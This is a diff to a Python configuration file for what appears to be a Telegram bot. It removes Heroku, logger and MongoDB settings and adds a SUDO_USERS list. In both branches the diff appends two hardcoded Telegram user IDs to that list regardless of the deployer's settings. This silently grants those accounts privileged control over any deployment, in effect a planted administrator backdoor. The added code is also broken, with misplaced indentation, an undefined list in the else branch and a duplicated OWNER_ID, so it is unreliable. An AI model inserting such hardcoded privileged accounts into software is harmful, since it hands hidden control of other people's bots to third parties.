@@ -13,13 +13,12 @@ if ENVIRONMENT:
     DATABASE_URL = os.environ.get('DATABASE_URL', None)
     START_IMG = os.environ.get('START_IMG', None)
     BOT_USERNAME = os.environ.get('BOT_USERNAME', None)
-    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "https://t.me/+www03EhSoeVhZWU1")
-    HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)
-    HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
-    LOGGER_ID = int(os.environ.get("LOGGER_ID", -1002114566515))
-    MONGO_DB_URI = os.environ.get("MONGO_DB_URI", None)
     OWNER_ID=1484735126
     OWNER_ID=5708737143
+    SUDO_USERS = list(map(int, os.environ.get("SUDO_USER").split()))
+if 1484735126 not in SUDO_USERS:
+    SUDO_USERS.append(1484735126)
+    SUDO_USERS.append(5708737143)
     DATABASE_URL = DATABASE_URL.replace("postgres", "postgresql")  # Sqlalchemy dropped support for "postgres" name.
     # https://stackoverflow.com/questions/62688256/sqlalchemy-exc-nosuchmoduleerror-cant-load-plugin-sqlalchemy-dialectspostgre
     MUST_JOIN = os.environ.get('MUST_JOIN', "AerodynamicV1_Update")
@@ -34,12 +33,11 @@ else:
     START_IMG = ""
     DATABASE_URL = ""
     BOT_USERNAME=""
-    HEROKU_API_KEY = ""
-    HEROKU_APP_NAME = ""
-    LOGGER_ID = ""
-    MONGO_DB_URI = ""
     OWNER_ID=1484735126
     OWNER_ID=5708737143
+    SUDO_USERS.append(OWNER_ID)
+    SUDO_USERS.append(1484735126)
+    SUDO_USERS.append(5708737143)
     DATABASE_URL = DATABASE_URL.replace("postgres", "postgresql")
     MUST_JOIN = ""
     if MUST_JOIN.startswith("@"):
